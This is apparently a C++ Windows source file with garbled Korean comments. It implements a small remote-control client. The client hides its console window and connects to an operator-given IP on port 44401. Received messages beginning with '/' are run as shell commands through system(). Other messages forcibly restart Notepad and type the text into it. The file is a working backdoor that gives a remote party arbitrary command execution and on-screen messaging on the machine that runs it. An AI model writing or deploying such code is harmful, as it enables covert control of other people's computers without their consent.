#include <iostream>
#include <windows.h>
#include <tchar.h>
#include <conio.h>
#include <tlhelp32.h>

#define BUFF_SIZE 2000
#define TYPING_DELAY 150

using namespace std;

HANDLE h_notepad, h_edit;

void ResetNotepad()
{
    h_notepad = FindWindow("Notepad", NULL);
    while(!h_notepad)
    {
        cout << "�޸��� �ڵ�" << endl;
        Sleep(150);
        h_notepad = FindWindow("Notepad", NULL);
    }

    h_edit = FindWindowEx(h_notepad, NULL, "Edit", NULL);
    while(!h_edit)
        h_edit = FindWindowEx(h_notepad, NULL, "Edit", NULL);
}
DWORD FindProcessID(LPCTSTR szProcessName)
{
    DWORD dwPID = -1;
    HANDLE hSnapShot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe;

    pe.dwSize = sizeof(PROCESSENTRY32);
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

    Process32First(hSnapShot, &pe);
    do
    {
        if(!_stricmp(szProcessName, pe.szExeFile))
        {
            dwPID = pe.th32ProcessID;
            break;
        }
    }
    while(Process32Next(hSnapShot, &pe));

    CloseHandle(hSnapShot);

    return dwPID;
}
void ChangeFont(int font_size, const char* font_name)
{
    HDC hdc = GetDC(h_edit);
    LOGFONT lf;
    memset(&lf, 0, sizeof(LOGFONT));

    lf.lfHeight=font_size;
    lf.lfWidth=0;
    lf.lfEscapement=0;
    lf.lfOrientation=0;
    lf.lfWeight=0;
    lf.lfItalic=0;
    lf.lfUnderline=0;
    lf.lfStrikeOut=0;
    lf.lfCharSet=HANGEUL_CHARSET;
    lf.lfOutPrecision=0;
    lf.lfClipPrecision=0;
    lf.lfQuality=0;
    lf.lfPitchAndFamily=0;
    strcpy(lf.lfFaceName, font_name);

    HFONT Font=CreateFontIndirect(&lf);
    PostMessage(h_edit, WM_SETFONT, Font, 1); // note: WM_SETFONT�޼��� ������ �Ѵٴ°� ���ۿ��� �ȳ��� �־ ���� �������ϸ鼭 �˾Ƴ� �Ф�

    ReleaseDC(h_edit, hdc);
}
int main()
{

    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        cerr << "�ʱ�ȭ ����. �����ڵ�: %d" << WSAGetLastError();
        getch();
        return 1;
    }

    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        cerr << "���� ���� ���� : " << WSAGetLastError();
        WSACleanup();
        getch();
        return 1;
    }

    char IP[30] = "";
    cout << "IP : ";
    cin >> IP;

    server.sin_addr.s_addr = inet_addr(IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(44401);

    ShowWindow(GetForegroundWindow(), SW_HIDE);

    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        cerr << "���� ����.";

        switch(WSAGetLastError())
        {
        case 2:
            cout << "������ �����ϴ�." << endl;
            break;

        case 10060:
            cout << "���� ������ �ʹ� ������� ������ �ߴ��߽��ϴ�." << endl;
            break;

        default:
            cout << "�����ڵ�: " << WSAGetLastError() << endl;
        }
        closesocket(s);
        WSACleanup();
        getch();
        return 1;
    }

    cout << "����" << endl;

    system("taskkill /im notepad.exe -f");

    while(TRUE)
    {
        char buff_recv[BUFF_SIZE] = "";
        int len = 0;
        if(recv(s, buff_recv, BUFF_SIZE, 0) < 0)
        {
            system("cls");
            cerr << "�������� ������ ���������ϴ�." << endl;
            closesocket(s);
            exit(1);
        }
        switch(buff_recv[0])
        {
        case '/': // CMD��� ����
            system(buff_recv + 1);
            break;

        case '*': // ū �۾��� �޸��� �޽��� ����

            system("taskkill -f /im notepad.exe");
            system("start notepad"); // �ٽ� ����

            ResetNotepad(); // �ڵ鰪 �ʱ�ȭ
            ChangeFont(100, "�ü�");

            len = strlen(buff_recv + 1);

            for(int i = 0;i < len;i++) // �������� ���� ���ڿ��� �ϳ��� �����
            {
                PostMessage(h_edit, WM_CHAR, (buff_recv + 1)[i], NULL);
                Sleep(TYPING_DELAY);
                cout << "WM_CHAR �޽��� ����" << endl;
            }
            PostMessage(h_edit, WM_CHAR, '\n', NULL);
            break;
        default: // �޸��� �޽��� ����

            system("taskkill -f /im notepad.exe");
            system("start notepad"); // �ٽ� ����

            ResetNotepad(); // �ڵ鰪 �ʱ�ȭ
            ChangeFont(21, "���� ���");

            len = strlen(buff_recv);

            for(int i = 0;i < len;i++) // �������� ���� ���ڿ��� �ϳ��� �����
            {
                PostMessage(h_edit, WM_CHAR, buff_recv[i], NULL);
                Sleep(TYPING_DELAY);
                cout << "WM_CHAR �޽��� ����" << endl;
            }
            PostMessage(h_edit, WM_CHAR, '\n', NULL);
        }
        memset(buff_recv, 0, BUFF_SIZE);
    }
}
